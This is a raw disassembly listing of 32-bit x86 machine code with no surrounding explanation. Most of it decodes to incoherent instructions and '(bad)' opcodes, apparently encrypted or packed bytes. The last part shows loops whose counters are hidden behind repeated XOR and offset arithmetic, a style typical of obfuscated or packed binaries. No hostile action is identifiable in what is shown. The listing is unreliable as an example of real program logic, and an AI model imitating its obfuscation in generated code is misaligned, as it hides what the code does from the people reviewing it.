  42066e:	xor    al,0x61
  420670:	push   0xbbf873ae
  420675:	arpl   WORD PTR [eax+0x7f373aa3],bx
  42067b:	dec    edx
  42067c:	sub    eax,0x8f81b3b3
  420681:	dec    eax
  420682:	cmp    al,0x4e
  420684:	ror    DWORD PTR [ebx],cl
  420686:	in     al,0xe6
  420688:	sub    BYTE PTR [ebp-0x4f],dl
  42068b:	lds    esp,FWORD PTR [eax-0x7b]
  42068e:	in     al,0x95
  420690:	(bad)  
  420691:	pop    ecx
  420692:	xlat   BYTE PTR ds:[ebx]
  420693:	sbb    al,BYTE PTR [edi]
  420695:	dec    esp
  420696:	fsubr  QWORD PTR [esi]
  420698:	mov    ecx,0x3b79ad2c
  42069d:	(bad)  
  42069e:	xchg   ebp,eax
  42069f:	out    dx,al
  4206a0:	xchg   ebp,eax
  4206a1:	jo     0x42064a
  4206a3:	popf   
  4206a4:	xchg   edx,eax
  4206a5:	lahf   
  4206a6:	aad    0xd3
  4206a8:	test   al,0x25
  4206aa:	sub    BYTE PTR [ebx+0x1e],0xf1
  4206ae:	adc    BYTE PTR [ebp+edx*4-0x2c69dfec],bl
  4206b5:	push   ss
  4206b6:	cmp    ecx,esp
  4206b8:	cld    
  4206b9:	add    ebp,ebx
  4206bb:	push   ebx
  4206bc:	cmp    eax,0xe9ef46e
  4206c1:	les    ecx,FWORD PTR [edi]
  4206c3:	jbe    0x4206d9
  4206c5:	repz (bad) 
  4206c7:	jnp    0x420701
  4206c9:	(bad)  
  4206ca:	jl     0x4206c9
  4206cc:	push   cs
  4206cd:	outs   dx,BYTE PTR ds:[esi]
  4206ce:	xchg   BYTE PTR [esi+0x5],ch
  4206d1:	mov    bl,0x8a
  4206d3:	or     eax,0x470d4f12
  4206d8:	xchg   ebx,eax
  4206d9:	mov    ah,al
  4206db:	push   ebx
  4206dc:	jbe    0x4206b1
  4206de:	mov    bh,0x1a
  4206e0:	cld    
  4206e1:	xchg   bl,bl
  4206e3:	js     0x420712
  4206e5:	cmp    BYTE PTR [ecx],0xf1
  4206e8:	sti    
  4206e9:	inc    ebp
  4206ea:	cld    
  4206eb:	mov    ah,0x25
  4206ed:	aad    0xa
  4206ef:	mov    dl,0x29
  4206f1:	hlt    
  4206f2:	mov    eax,DWORD PTR [eax-0x80]
  4206f5:	pushf  
  4206f6:	xchg   esp,eax
  4206f7:	cmp    DWORD PTR [eax-0x49],esp
  4206fa:	bound  eax,QWORD PTR [eax+0x9]
  4206fd:	stos   DWORD PTR es:[edi],eax
  4206fe:	es retf 
  420700:	scas   eax,DWORD PTR es:[edi]
  420701:	inc    esi
  420702:	div    DWORD PTR [ebx-0xf]
  420705:	std    
  420706:	push   ecx
  420707:	cmp    ecx,ebx
  420709:	xchg   ebx,eax
  42070a:	daa    
  42070b:	dec    ebx
  42070c:	pop    esi
  42070d:	in     eax,0x22
  42070f:	mov    al,0x3c
  420711:	in     al,0xba
  420713:	(bad)  
  420714:	sti    
  420715:	cdq    
  420716:	out    0x98,eax
  420718:	mov    eax,0xf9b776db
  42071d:	imul   ebx,DWORD PTR [edx-0x7b],0x31026270
  420724:	jno    0x42077d
  420726:	sbb    al,0xc3
  420728:	ja     0x4206fc
  42072a:	rcr    BYTE PTR [esi-0x4c50a538],cl
  420730:	mov    ah,dl
  420732:	(bad)
  420736:	push   esi
  420737:	clc    
  420738:	pushf  
  420739:	jno    0x420716
  42073b:	inc    ecx
  42073c:	int    0x13
  42073e:	push   es
  42073f:	xchg   esp,eax
  420740:	inc    ecx
  420741:	push   ds
  420742:	nop
  420743:	sbb    DWORD PTR [edx-0x67],0x54b9133c
  42074a:	cli    
  42074b:	push   edi
  42074c:	jecxz  0x42072d
  42074e:	jg     0x420754
  420750:	jns    0x4206d2
  420752:	add    eax,0x33727706
  420757:	(bad)  
  420759:	pop    edx
  42075a:	sbb    eax,0x792603f4
  42075f:	retf   
  420760:	jmp    0xe351c2c1
  420765:	jp     0x420711
  420767:	leave  
  420768:	pop    es
  420769:	pop    ebp
  42076a:	push   es
  42076b:	daa    
  42076c:	aas    
  42076d:	jl     0x4207de
  42076f:	mov    al,ds:0x835839ca
  420774:	std    
  420775:	mov    ebp,0x8b29a9f5
  42077a:	outs   dx,BYTE PTR ds:[esi]
  42077b:	inc    edi
  42077c:	(bad)  
  42077d:	xchg   esp,eax
  42077e:	jmp    esi
  420780:	aaa    
  420781:	aam    0x5d
  420783:	push   ebp
  420784:	lea    eax,[esi]
  420786:	mov    BYTE PTR [ebx+0xb],al
  420789:	pushf  
  42078a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42078b:	shr    DWORD PTR [edi-0x7],cl
  42078e:	mov    ah,0xf5
  420790:	pop    ebp
  420791:	mov    BYTE PTR [eax],ah
  420793:	jmp    eax
  420795:	test   eax,0x7d3f35c1
  42079a:	mov    esi,0x84e43b80
  42079f:	aaa    
  4207a0:	xor    eax,0x54855855
  4207a5:	das    
  4207a6:	push   ecx
  4207a7:	mov    ds:0x50c52740,eax
  4207ac:	lahf   
  4207ad:	js     0x42075d
  4207af:	sub    ebp,DWORD PTR [edx]
  4207b1:	nop
  4207b2:	jle    0x420735
  4207b4:	cmp    eax,0x50137505
  4207b9:	das    
  4207ba:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4207bb:	aas    
  4207bc:	call   0x3840b10b
  4207c1:	cmp    eax,DWORD PTR [esi]
  4207c3:	mov    dl,0x18
  4207c5:	loope  0x42078a
  4207c7:	mov    esi,0x75a97175
  4207cc:	sub    cl,cl
  4207ce:	bound  edi,QWORD PTR [edx-0x58]
  4207d1:	jnp    0x42083f
  4207d3:	pusha  
  4207d4:	or     edx,DWORD PTR [edx-0x2f301496]
  4207da:	xchg   ebp,eax
  4207db:	inc    ebp
  4207dc:	mov    esi,DWORD PTR [ecx*8+0x1528bd01]
  4207e3:	xchg   ebp,eax
  4207e4:	fwait
  4207e5:	mov    bh,0x4e
  4207e7:	xor    ebx,esi
  4207e9:	sbb    DWORD PTR [eax],edx
  4207eb:	or     edi,DWORD PTR [edi]
  4207ed:	sbb    al,BYTE PTR ds:0x4bc38952
  4207f3:	push   DWORD PTR [edx]
  4207f5:	je     0x42080e
  4207f7:	jo     0x420840
  4207f9:	mov    eax,0x39cee3c8
  4207fe:	pop    esp
  4207ff:	mov    ds:0x81eb8695,eax
  420804:	and    eax,0x941da142
  420809:	xor    bl,0x6d
  42080c:	mov    ds:0x36be53a4,eax
  420811:	jb     0x4207fd
  420813:	in     al,dx
  420814:	fsubr  st,st(7)
  420816:	mov    esp,0xa286ea89
  42081b:	cmc    
  42081c:	scas   eax,DWORD PTR es:[edi]
  42081d:	pop    esi
  42081e:	fcomp  QWORD PTR [ebp+0x205d7673]
  420824:	xor    al,0x74
  420826:	push   eax
  420827:	cwde   
  420828:	js     0x4207f8
  42082a:	dec    esp
  42082b:	rcr    DWORD PTR [edx-0x33658619],0x6b
  420832:	iret   
  420833:	lock and BYTE PTR [edi+0x49],0x60
  420838:	stos   DWORD PTR es:[edi],eax
  420839:	call   0xd100b0ea
  42083e:	jecxz  0x42080b
  420840:	push   ss
  420841:	mov    bl,0x4d
  420843:	cli    
  420844:	lods   eax,DWORD PTR ds:[esi]
  420845:	test   al,0x13
  420847:	jecxz  0x4207eb
  420849:	dec    esp
  42084a:	inc    ecx
  42084b:	ffree  st(4)
  42084d:	add    DWORD PTR ds:0xde398909,edi
  420853:	ja     0x420840
  420855:	xor    DWORD PTR [ecx+0x45],ecx
  420858:	adc    BYTE PTR gs:[ebx+edx*4-0x52],ah
  42085d:	jmp    0x4208bd
  42085f:	sbb    dl,BYTE PTR [esi+0x1b40e563]
  420865:	nop
  420866:	imul   edi,DWORD PTR [ebp-0x58],0xffffffe9
  42086a:	push   ds
  42086b:	stos   BYTE PTR es:[edi],al
  42086c:	std    
  42086d:	lea    edx,[esi]
  42086f:	inc    edi
  420870:	std    
  420871:	hlt    
  420872:	dec    ebp
  420873:	xor    BYTE PTR [ebp+ebp*4-0x1c],al
  420877:	xchg   esi,edi
  420879:	mov    dl,0x87
  42087b:	sub    BYTE PTR [esi+0x68],0xfb
  42087f:	push   0xffffffaf
  420881:	mov    ds:0xadddd304,al
  420886:	mov    ds:0x81ea2120,eax
  42088b:	outs   dx,DWORD PTR ds:[esi]
  42088c:	rol    BYTE PTR [eax+0x79b51a75],1
  420892:	add    bh,BYTE PTR [ecx+0x68]
  420895:	in     al,dx
  420896:	cli    
  420897:	and    DWORD PTR [esi],ebp
  420899:	ret    
  42089a:	jae    0x4208ef
  42089c:	out    0xcb,eax
  42089e:	and    eax,0xf2976cd
  4208a3:	pop    DWORD PTR [esi-0x41]
  4208a6:	mov    WORD PTR [edx+0x41],fs
  4208a9:	repnz fs xchg ecx,eax
  4208ac:	mov    ebp,0x52510bdd
  4208b1:	dec    ecx
  4208b2:	icebp  
  4208b3:	and    BYTE PTR [ecx],ch
  4208b5:	mov    bl,0x65
  4208b7:	xchg   ebx,eax
  4208b8:	push   0xb0da065a
  4208bd:	xor    DWORD PTR [ecx],esp
  4208bf:	push   cs
  4208c0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4208c1:	mov    ds:0xad7f01d9,eax
  4208c6:	repnz mov cl,0x18
  4208c9:	loop   0x4208b5
  4208cb:	test   eax,ebx
  4208cd:	stc    
  4208ce:	dec    ebx
  4208cf:	scas   eax,DWORD PTR es:[edi]
  4208d0:	sub    ah,BYTE PTR [ebx]
  4208d2:	xchg   edx,eax
  4208d3:	test   DWORD PTR [esi],eax
  4208d5:	xchg   edx,eax
  4208d6:	push   ds
  4208d7:	ins    BYTE PTR es:[edi],dx
  4208d8:	push   cs
  4208d9:	inc    ebp
  4208da:	es aam 0xbe
  4208dd:	ror    DWORD PTR [ebp+edi*4-0x74],cl
  4208e1:	aas    
  4208e2:	ds dec esi
  4208e4:	aam    0x90
  4208e6:	in     al,dx
  4208e7:	fsub   st,st(0)
  4208e9:	rol    al,cl
  4208eb:	mov    edx,0x6defa017
  4208f0:	test   BYTE PTR [edx-0x4b58cb00],0x86
  4208f7:	dec    ecx
  4208f8:	call   FWORD PTR [ecx+ebx*8-0x22]
  4208fc:	stos   BYTE PTR es:[edi],al
  4208fd:	jno    0x4208d9
  4208ff:	inc    edi
  420900:	sbb    cl,BYTE PTR [eax+0x141fb58d]
  420906:	mov    dh,BYTE PTR [ecx-0xc]
  420909:	push   0xffffffe7
  42090b:	jecxz  0x42094f
  42090d:	icebp  
  42090e:	mov    al,0xb4
  420910:	pusha  
  420911:	sbb    BYTE PTR [eax+0x1b],dl
  420914:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420915:	push   cs
  420916:	xchg   esp,eax
  420917:	pop    esp
  420918:	add    BYTE PTR [edx+ebx*1],0x5c
  42091c:	test   al,0x70
  42091e:	test   al,0x9e
  420920:	xor    eax,0x85fad2
  420925:	mov    edi,0x764a3296
  42092a:	popa   
  42092b:	nop
  42092c:	fsubp  st(2),st
  42092e:	dec    edi
  42092f:	jbe    0x420915
  420931:	inc    esi
  420932:	adc    eax,0x73263b95
  420937:	jno    0x42098b
  420939:	loopne 0x4209a2
  42093b:	pop    ds
  42093c:	shl    esi,1
  42093e:	out    0x29,al
  420940:	mov    dh,0x81
  420942:	gs xchg edi,eax
  420944:	imul   ebx,esp,0xf43f1c5b
  42094a:	fucom  st(3)
  42094d:	add    eax,0x1de5d8da
  420952:	pop    eax
  420953:	(bad)  
  420954:	arpl   WORD PTR [eax-0x2e593a06],dx
  42095a:	mov    esp,0x9fb6c058
  42095f:	sbb    eax,0x6d53873c
  420964:	mov    ah,0xdb
  420966:	jbe    0x420987
  420968:	lods   al,BYTE PTR ds:[esi]
  420969:	std    
  42096a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42096b:	jge    0x4209ca
  42096d:	icebp  
  42096e:	out    dx,eax
  42096f:	add    eax,0x902cb8fa
  420974:	shl    al,cl
  420976:	imul   ebx,DWORD PTR [ebp-0x6a],0x6cf58427
  42097d:	jb     0x4209c4
  42097f:	shr    ebx,cl
  420981:	pop    eax
  420982:	cmp    eax,0xf1b473e7
  420987:	xchg   ecx,eax
  420988:	mov    esi,0x6d8ce8f4
  42098d:	jp     0x420964
  42098f:	cld    
  420990:	mov    ah,0x6f
  420992:	inc    esi
  420993:	imul   ebx,DWORD PTR [ebp-0x575b906d],0xe3bb1d67
  42099d:	or     BYTE PTR [ecx+0x7c],dl
  4209a0:	fs mov dh,0xf4
  4209a3:	fmul   st(5),st
  4209a5:	ins    DWORD PTR es:[edi],dx
  4209a6:	push   esp
  4209a7:	pop    ss
  4209a8:	ss and eax,0xa257f8fc
  4209ae:	pop    edx
  4209af:	jb     0x420975
  4209b1:	and    esp,DWORD PTR [edx+0x50]
  4209b4:	ins    DWORD PTR es:[edi],dx
  4209b5:	sbb    edx,ecx
  4209b7:	or     DWORD PTR ds:0xc27a267d,esi
  4209bd:	scas   eax,DWORD PTR es:[edi]
  4209be:	inc    eax
  4209bf:	ins    DWORD PTR es:[edi],dx
  4209c0:	sub    ch,0x5e
  4209c3:	shr    BYTE PTR [ecx],cl
  4209c5:	jmp    0xbb58:0x536f871e
  4209cc:	xor    bh,0x34
  4209cf:	mov    eax,0x4b267602
  4209d4:	dec    ebp
  4209d5:	xchg   ecx,eax
  4209d6:	sub    eax,0x2827ed5b
  4209db:	scas   eax,DWORD PTR es:[edi]
  4209dc:	pop    edx
  4209dd:	push   esi
  4209de:	(bad)  [edi+esi*4-0x51]
  4209e2:	retf   
  4209e3:	pop    es
  4209e4:	out    0xa0,al
  4209e6:	add    cl,BYTE PTR [ebp-0x9]
  4209e9:	push   eax
  4209ea:	mov    bh,bh
  4209ec:	xor    edi,esi
  4209ee:	cli    
  4209ef:	fiadd  DWORD PTR [edi+0x54731cd9]
  4209f5:	mov    ebx,0x859c5305
  4209fa:	js     0x420a1b
  4209fc:	outs   dx,BYTE PTR ds:[esi]
  4209fd:	imul   eax,DWORD PTR [eax],0x7482025b
  420a03:	pop    esi
  420a04:	inc    edi
  420a05:	lahf   
  420a06:	add    cl,bh
  420a08:	inc    edi
  420a09:	inc    edx
  420a0a:	ret    
  420a0b:	enter  0xa3be,0xdc
  420a0f:	cwde   
  420a10:	int    0xf4
  420a12:	(bad)  
  420a13:	dec    edi
  420a14:	xchg   DWORD PTR ds:0xfa51ae6d,edx
  420a1a:	mov    eax,0x284d824
  420a1f:	cmp    BYTE PTR [ebp-0x3b],ah
  420a22:	(bad)  
  420a23:	out    0x92,eax
  420a25:	pop    esi
  420a26:	test   al,0x71
  420a28:	adc    DWORD PTR [ebp-0x77],ecx
  420a2b:	cmc    
  420a2c:	jp     0x420a86
  420a2e:	push   esp
  420a2f:	pop    ebp
  420a30:	and    DWORD PTR [edi-0x43ab1c0f],ebx
  420a36:	lock pop esi
  420a38:	jg     0x420a7c
  420a3a:	enter  0x5832,0x97
  420a3e:	lds    edi,FWORD PTR [edi+eax*1]
  420a41:	cwde   
  420a42:	inc    edx
  420a43:	stc    
  420a44:	adc    eax,0xf5cf4dca
  420a49:	inc    ecx
  420a4a:	into   
  420a4b:	inc    ebp
  420a4c:	retf   0x200e
  420a4f:	adc    esp,DWORD PTR [ebx+0x6186461f]
  420a55:	mov    al,0xf8
  420a57:	nop
  420a58:	mov    esp,0x771296c6
  420a5d:	adc    DWORD PTR [ecx-0xc],ebp
  420a60:	inc    eax
  420a61:	and    bl,al
  420a63:	dec    edx
  420a64:	mov    bh,BYTE PTR [edx-0x35]
  420a67:	fsub   st,st(0)
  420a69:	imul   ebx,DWORD PTR [esi-0x26d88e3],0x5c
  420a70:	mov    dl,0xf5
  420a72:	rcl    BYTE PTR ss:[edi-0x4689149c],cl
  420a79:	xchg   esi,eax
  420a7a:	jmp    0x4f5d:0xbd28e94e
  420a81:	mov    edi,0x3d46beff
  420a86:	sahf   
  420a87:	ja     0x420ac3
  420a89:	sbb    dh,BYTE PTR [esi-0x64ce3b08]
  420a8f:	push   edi
  420a90:	sub    BYTE PTR [ebx+0x78],0x3b
  420a94:	jl     0x420a74
  420a96:	jbe    0x420a6b
  420a98:	paddsb mm0,QWORD PTR [eax-0x2a4a7c08]
  420a9f:	data16 jmp 0x420b1d
  420aa2:	aas    
  420aa3:	adc    esp,ecx
  420aa5:	fbstp  TBYTE PTR [eax]
  420aa7:	popa   
  420aa8:	dec    ebp
  420aa9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420aaa:	call   0x8a30:0xdbfd08c
  420ab1:	dec    edx
  420ab2:	mov    dh,0xd
  420ab4:	cmp    edi,DWORD PTR [esi+0x4d98fe27]
  420aba:	clc    
  420abb:	xchg   edx,edx
  420abd:	push   esi
  420abe:	cli    
  420abf:	inc    edi
  420ac0:	mov    esi,0x8abf62e7
  420ac5:	clc    
  420ac6:	scas   al,BYTE PTR es:[edi]
  420ac7:	cli    
  420ac8:	jge    0x420afc
  420aca:	shr    DWORD PTR [ecx+esi*1+0x5750ef1a],cl
  420ad1:	cmp    al,0x10
  420ad3:	or     DWORD PTR [esi+ecx*4-0x1e],edi
  420ad7:	push   esi
  420ad8:	adc    esi,DWORD PTR [esi-0x714ed115]
  420ade:	in     eax,0x10
  420ae0:	pushf  
  420ae1:	and    ecx,ebp
  420ae3:	adc    DWORD PTR [ecx-0xb],ecx
  420ae6:	sahf   
  420ae7:	out    0xf2,eax
  420ae9:	in     eax,0x92
  420aeb:	imul   edx,DWORD PTR [ecx+0x3bd70c68],0xdd04aee5
  420af5:	lds    ebp,FWORD PTR [ebp-0x66]
  420af8:	rcl    DWORD PTR [ecx+eax*4+0x72e14d89],cl
  420aff:	dec    eax
  420b00:	adc    esp,0xfffffff5
  420b03:	cmp    BYTE PTR [edx+0x31],0xec
  420b07:	xor    al,BYTE PTR [ecx+esi*2+0x28a2584c]
  420b0e:	mov    cl,0x75
  420b10:	fbstp  TBYTE PTR [eax+0x5f]
  420b13:	jns    0x420b63
  420b15:	pop    ebp
  420b16:	(bad)  
  420b17:	scas   ax,WORD PTR es:[edi]
  420b19:	ins    DWORD PTR es:[edi],dx
  420b1a:	data16 std 
  420b1c:	imul   esp,DWORD PTR [ecx+ecx*8],0xad2256bc
  420b23:	mul    ch
  420b25:	ins    BYTE PTR es:[edi],dx
  420b26:	add    BYTE PTR [edi],ch
  420b28:	jb     0x420b29
  420b2a:	adc    eax,0x24d34008
  420b2f:	rol    BYTE PTR [ebx+0x61],0x5a
  420b33:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420b34:	aad    0x5a
  420b36:	ja     0x420b5b
  420b38:	xchg   ecx,eax
  420b39:	jne    0x420b32
  420b3b:	jl     0x420b6e
  420b3d:	dec    ebx
  420b3e:	std    
  420b3f:	mov    bh,0x70
  420b41:	lock xor al,0x2d
  420b44:	scas   eax,DWORD PTR es:[edi]
  420b45:	dec    edx
  420b46:	cmp    DWORD PTR [edi],ebp
  420b48:	ds push ss
  420b4a:	jbe    0x420afc
  420b4c:	jbe    0x420add
  420b4e:	xchg   edx,eax
  420b4f:	fwait
  420b50:	imul   ebx,DWORD PTR [edx-0x649d79f5],0x3f
  420b57:	es mov edi,cs
  420b5a:	punpckldq mm5,mm5
  420b5d:	add    edi,DWORD PTR [eax]
  420b5f:	out    dx,eax
  420b60:	ins    DWORD PTR es:[edi],dx
  420b61:	aas    
  420b62:	jmp    0x420ae7
  420b64:	clc    
  420b65:	push   ecx
  420b66:	test   eax,0x304152cf
  420b6b:	jmp    0x7e3e:0xb9a8ddb6
  420b72:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420b73:	mov    ds:0x70678f93,eax
  420b78:	pop    esi
  420b79:	sub    BYTE PTR [esi-0x41fe4800],al
  420b7f:	icebp  
  420b80:	fld    DWORD PTR [ecx]
  420b82:	dec    eax
  420b83:	lds    ebx,FWORD PTR [ebx+0x45725562]
  420b89:	cdq    
  420b8a:	pushf  
  420b8b:	icebp  
  420b8c:	pop    eax
  420b8d:	fcomp  QWORD PTR ds:0xb612177a
  420b93:	mov    cl,BYTE PTR [ecx]
  420b95:	jp     0x420ba6
  420b97:	pop    ebp
  420b98:	inc    ebp
  420b99:	(bad)
  420b9d:	sbb    edx,ebx
  420b9f:	push   ss
  420ba0:	jne    0x420baf
  420ba2:	shr    DWORD PTR [ebp+0x769663a0],0x8e
  420ba9:	jnp    0x420b52
  420bab:	push   edx
  420bac:	ror    edx,1
  420bae:	push   esi
  420baf:	aam    0x98
  420bb1:	dec    ecx
  420bb2:	xchg   BYTE PTR [ebx-0xc],ah
  420bb5:	(bad)  
  420bb6:	scas   al,BYTE PTR es:[edi]
  420bb7:	or     DWORD PTR [ecx+0x14e55236],ecx
  420bbd:	int3   
  420bbe:	sti    
  420bbf:	loopne 0x420b5c
  420bc1:	pop    esi
  420bc2:	or     al,0x7d
  420bc4:	and    ebx,ebp
  420bc6:	and    ecx,ebp
  420bc8:	push   cs
  420bc9:	clc    
  420bca:	into   
  420bcb:	xor    eax,0x11f7c71b
  420bd0:	sub    edi,DWORD PTR [ebp+eiz*2+0x4c]
  420bd4:	dec    eax
  420bd5:	jmp    0x7a2:0xfe9045f8
  420bdc:	fild   DWORD PTR [ecx]
  420bde:	cld    
  420bdf:	adc    esp,DWORD PTR [esi-0x5c70baf0]
  420be5:	inc    ecx
  420be6:	outs   dx,DWORD PTR ds:[esi]
  420be7:	push   ds
  420be8:	es dec edi
  420bea:	jne    0x420bae
  420bec:	jns    0x420bbc
  420bee:	(bad)  
  420bf0:	sub    BYTE PTR [ebx-0x7a],bl
  420bf3:	jp     0x420c0a
  420bf5:	nop
  420bf6:	mov    edi,0x8824615a
  420bfb:	dec    eax
  420bfc:	stos   DWORD PTR es:[edi],eax
  420bfd:	fadd   DWORD PTR [ecx]
  420bff:	mov    ebp,0xd73a9351
  420c04:	push   ds
  420c05:	jmp    0x420c4b
  420c07:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420c08:	or     esp,DWORD PTR [esi]
  420c0a:	push   ebp
  420c0b:	lea    esp,[eax+0x3488b329]
  420c11:	sub    edi,esi
  420c13:	dec    esi
  420c14:	mov    dh,0x94
  420c16:	ss es jp 0x420c22
  420c1a:	arpl   WORD PTR [edx+0x2f],di
  420c1d:	xchg   ebp,eax
  420c1e:	mov    edi,DWORD PTR [eax]
  420c20:	push   ds
  420c21:	enter  0x9b2a,0x56
  420c25:	dec    edx
  420c26:	push   eax
  420c27:	repnz adc eax,0x644a8655
  420c2d:	xchg   edx,eax
  420c2e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420c2f:	mov    edx,0x69d3f500
  420c34:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420c35:	jg     0x420bb9
  420c37:	lods   eax,DWORD PTR ds:[esi]
  420c38:	mov    dl,0x8
  420c3a:	cmp    BYTE PTR [edx],dh
  420c3c:	push   ss
  420c3d:	or     DWORD PTR [edi],eax
  420c3f:	cmp    eax,DWORD PTR [ecx]
  420c41:	adc    bl,bl
  420c43:	pop    esi
  420c44:	xchg   esi,eax
  420c45:	or     BYTE PTR [ecx],ah
  420c47:	repz push edi
  420c49:	popf   
  420c4a:	lods   al,BYTE PTR ds:[esi]
  420c4b:	dec    DWORD PTR [ecx]
  420c4d:	inc    edi
  420c4e:	jmp    0xef63:0x5169094f
  420c55:	xchg   DWORD PTR [edi],eax
  420c57:	add    al,0xbb
  420c59:	lods   eax,DWORD PTR ds:[esi]
  420c5a:	and    cl,BYTE PTR [ebp-0x7c]
  420c5d:	xchg   edx,eax
  420c5e:	and    eax,0x903091e
  420c63:	mov    ah,0x2f
  420c65:	stos   BYTE PTR es:[edi],al
  420c66:	lods   eax,DWORD PTR ds:[esi]
  420c67:	mov    al,0xbc
  420c69:	in     al,dx
  420c6a:	out    dx,eax
  420c6b:	mov    cl,0xb
  420c6d:	mov    al,ds:0x31d56d72
  420c72:	fidiv  WORD PTR [edx+0x4b]
  420c75:	and    ebx,edi
  420c77:	loope  0x420ca1
  420c79:	fisub  WORD PTR [ebp-0x75]
  420c7c:	jae    0x420cb3
  420c7e:	cwde   
  420c7f:	jl     0x420c59
  420c81:	mov    esi,0xc940a846
  420c86:	mov    esp,0x556f8fdb
  420c8b:	cs pop ds
  420c8d:	xor    BYTE PTR [eax],bh
  420c8f:	mov    esp,0xdacb69cd
  420c94:	repnz outs dx,BYTE PTR ds:[esi]
  420c96:	mov    al,0xf9
  420c98:	jg     0x420c26
  420c9a:	shl    BYTE PTR [edx-0xc24ca8e],cl
  420ca0:	inc    edi
  420ca1:	inc    eax
  420ca2:	or     DWORD PTR [eax],edi
  420ca4:	cmp    sp,WORD PTR [ebx+0x4cb1e522]
  420cab:	pop    esi
  420cac:	test   eax,0xb61a0b4d
  420cb1:	aad    0x57
  420cb3:	mov    ebp,0x47e105d3
  420cb8:	mov    edx,0xd37c798e
  420cbd:	inc    ebx
  420cbe:	out    0x5c,eax
  420cc0:	jecxz  0x420cf3
  420cc2:	add    dh,bl
  420cc4:	mov    eax,ds:0x46da0ed7
  420cc9:	adc    ah,cl
  420ccb:	pusha  
  420ccc:	jns    0x420cb0
  420cce:	repz mov dl,0x77
  420cd1:	repnz or BYTE PTR [ebx-0x1e7bcdc4],dl
  420cd8:	jge    0x420d21
  420cda:	push   ebp
  420cdb:	imul   eax,ebx,0x3a3797d7
  420ce1:	(bad)  
  420ce2:	pop    esp
  420ce3:	les    esp,FWORD PTR [ebx-0x9]
  420ce6:	xor    BYTE PTR [ecx-0x49d60916],0x19
  420ced:	cwde   
  420cee:	mov    ah,0x1b
  420cf0:	mov    edx,0x7874ef3
  420cf5:	in     eax,dx
  420cf6:	jbe    0x420d58
  420cf8:	adc    dh,BYTE PTR [ebx+0x7b]
  420cfb:	data16 aad 0xd1
  420cfe:	sbb    ch,BYTE PTR [edi+0x4a]
  420d01:	clc    
  420d02:	xlat   BYTE PTR ds:[ebx]
  420d03:	mov    edx,0xc0eed156
  420d08:	and    al,0xd1
  420d0a:	sub    eax,0xdfa82a84
  420d0f:	cs stos DWORD PTR es:[edi],eax
  420d11:	js     0x420cab
  420d13:	div    DWORD PTR [esi]
  420d15:	mov    dl,0x33
  420d17:	sti    
  420d18:	mov    DWORD PTR [edx],edi
  420d1a:	mov    edx,DWORD PTR [ebp+0x8]
  420d1d:	xor    edx,eax
  420d1f:	inc    ecx
  420d20:	inc    DWORD PTR [ebp-0x18]
  420d23:	add    edx,esi
  420d25:	cmp    ecx,edx
  420d27:	jb     0x41e963
  420d2d:	jmp    0x420d77
  420d32:	mov    ecx,DWORD PTR [ebp-0xc]
  420d35:	mov    DWORD PTR [ebp+0x8],ecx
  420d38:	jmp    0x420d6a
  420d3d:	mov    ecx,DWORD PTR [ebp+0x8]
  420d40:	mov    edx,DWORD PTR [ebp-0x8]
  420d43:	xor    ecx,eax
  420d45:	xor    edx,eax
  420d47:	sub    ecx,edx
  420d49:	sub    ecx,esi
  420d4b:	xor    ecx,eax
  420d4d:	mov    DWORD PTR [ebp+0x8],ecx
  420d50:	mov    ecx,DWORD PTR [ebp+0x8]
  420d53:	mov    edx,DWORD PTR [ebp+0x8]
  420d56:	imul   edx,edx,0x5708f2
  420d5c:	xor    ecx,eax
  420d5e:	add    ecx,esi
  420d60:	lea    ecx,[ebp+ecx*4-0x64]
  420d64:	mov    edi,DWORD PTR [ecx]
  420d66:	add    edx,edi
  420d68:	mov    DWORD PTR [ecx],edx
  420d6a:	mov    ecx,DWORD PTR [ebp+0x8]
  420d6d:	xor    ecx,eax
  420d6f:	add    ecx,esi
  420d71:	jne    0x420d3d
  420d77:	mov    ecx,DWORD PTR [ebp-0xc]
  420d7a:	mov    DWORD PTR [ebp+0x8],ecx
  420d7d:	jmp    0x420daf
  420d82:	mov    ecx,DWORD PTR [ebp+0x8]
  420d85:	mov    edx,DWORD PTR [ebp-0x8]
  420d88:	xor    ecx,eax
  420d8a:	xor    edx,eax
  420d8c:	sub    ecx,edx
  420d8e:	sub    ecx,esi
  420d90:	xor    ecx,eax
  420d92:	mov    DWORD PTR [ebp+0x8],ecx
  420d95:	mov    ecx,DWORD PTR [ebp+0x8]
  420d98:	mov    edx,DWORD PTR [ebp+0x8]
  420d9b:	imul   edx,edx,0x5708f2
  420da1:	xor    ecx,eax
  420da3:	add    ecx,esi
  420da5:	lea    ecx,[ebp+ecx*4-0x64]
  420da9:	mov    edi,DWORD PTR [ecx]
  420dab:	add    edx,edi
  420dad:	mov    DWORD PTR [ecx],edx
  420daf:	mov    ecx,DWORD PTR [ebp+0x8]
  420db2:	xor    ecx,eax
  420db4:	add    ecx,esi
  420db6:	jne    0x420d82
  420dbc:	mov    ecx,DWORD PTR [ebp-0x8]
  420dbf:	mov    edx,DWORD PTR [ebp-0x20]
  420dc2:	xor    ecx,eax
  420dc4:	lea    ecx,[ecx+edx*1+0x3272dd]
  420dcb:	mov    DWORD PTR [ebp-0x20],ecx
  420dce:	inc    DWORD PTR [ebp+0xc]
  420dd1:	mov    ecx,DWORD PTR [ebp-0x1c]
  420dd4:	xor    ecx,eax
  420dd6:	add    ecx,esi
  420dd8:	jne    0x413678
  420dde:	jmp    0x420e67
  420de3:	mov    ecx,DWORD PTR [ebp-0xc]
  420de6:	mov    DWORD PTR [ebp+0x8],ecx
  420de9:	jmp    0x420e1b
  420dee:	mov    ecx,DWORD PTR [ebp+0x8]
  420df1:	mov    edx,DWORD PTR [ebp-0x8]
  420df4:	xor    ecx,eax
  420df6:	xor    edx,eax
  420df8:	sub    ecx,edx
  420dfa:	sub    ecx,esi
  420dfc:	xor    ecx,eax
  420dfe:	mov    DWORD PTR [ebp+0x8],ecx
